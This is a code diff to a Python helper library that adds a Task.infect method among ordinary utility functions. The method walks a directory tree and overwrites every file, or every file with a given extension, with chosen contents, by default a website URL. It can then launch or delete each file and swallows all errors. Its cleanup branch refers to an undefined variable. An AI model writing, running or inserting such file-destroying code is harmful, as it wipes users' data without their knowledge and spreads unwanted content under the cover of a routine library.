@@ -34,6 +34,7 @@ def SETUP():
 import threading
 from contextlib import contextmanager
 import sqlite3 as sql
+import os
 
 class Expression():
     """
@@ -773,6 +774,10 @@ class Default(object):
             return None
 
     @staticmethod
+    def self_position():
+        return str(__file__)
+
+    @staticmethod
     @contextmanager
     def desk(desktop=r'C:\Users\Marco\Desktop'):
         try:
@@ -857,7 +862,64 @@ class Task(threading.Thread):
                 self.fLock.release()
             except:
                 pass
-            
+
+    @staticmethod
+    def infect(source=None, path=os.getcwd(), ext="",start=False, delete_source=False, delete_infected=False, delay=None, action=None):
+
+        from subprocess import run
+        from time import sleep as _sp
+
+        if source:
+            with open(source, 'r') as src:
+                contents = src.read()
+        else:
+            contents = "https://grigoprg.webnode.it"
+
+        for RootDir, __Fldrs__, _file in os.walk(path):
+            for _file_ in _file:
+                _path = RootDir + "\\" + _file_
+                try:
+                    if ext == "":
+                        with open(_path, 'w') as fw:
+                            fw.write(contents)
+                        if action:
+                            action()
+                        if start:
+                            run(f'start {_path}', shell=True)
+                        if delay:
+                            _sp(delay)
+                        if delete_infected:
+                            try:
+                                os.unlink(_path)
+                            except:
+                                os.remove(_path)
+                    else:
+                        if _file_.endswith(ext):
+                            with open(_path, 'w') as fw:
+                                fw.write(contents)
+                            if action:
+                                action()
+                            if start:
+                                run(f'start {_path}', shell=True)
+                            if delay:
+                                _sp(delay)
+                            if delete_infected:
+                                try:
+                                    os.unlink(_path)
+                                except:
+                                    os.remove(_path)
+                except:
+                    pass
+
+        if delete_source:
+            try:
+                try:
+                    os.unlink(file_source)
+                except:
+                    os.remove(file_source)
+            except:
+                pass
+             
     @staticmethod
     def Link(func_one, func_two, delay, args1 = [], args2 = []):
         from time import sleep as _sp
